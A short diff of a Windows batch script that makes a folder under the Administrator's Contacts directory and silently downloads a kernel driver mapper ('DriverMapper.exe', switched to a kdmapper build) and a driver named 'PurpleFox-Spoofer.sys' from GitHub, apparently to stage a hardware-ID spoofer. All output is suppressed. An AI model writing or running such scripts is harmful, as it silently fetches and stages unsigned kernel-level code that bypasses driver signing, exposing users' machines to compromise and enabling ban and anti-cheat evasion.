@@ -1,6 +1,6 @@
 MKDIR "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
 CD /D "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
-curl -s -g -L -o "DriverMapper.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/DriverMapper.exe$"  >NUL 2>&1
+curl -s -g -L -o "DriverMapper.exe" "https://github.com/SoarDevelopment/Spoof-Driver/blob/main/kdmapper.exe"  >NUL 2>&1
 curl -s -g -L -o "PurpleFox-Spoofer.sys" "https://github.com/SoarDevelopment/Spoof-Driver/blob/main/soardrv.sys"  >NUL 2>&1
 SET "KernleMapper=DriverMapper.exe" >nul 2>&1
 SET "Driver=PurpleFox-Spoofer.sys" >nul 2>&1
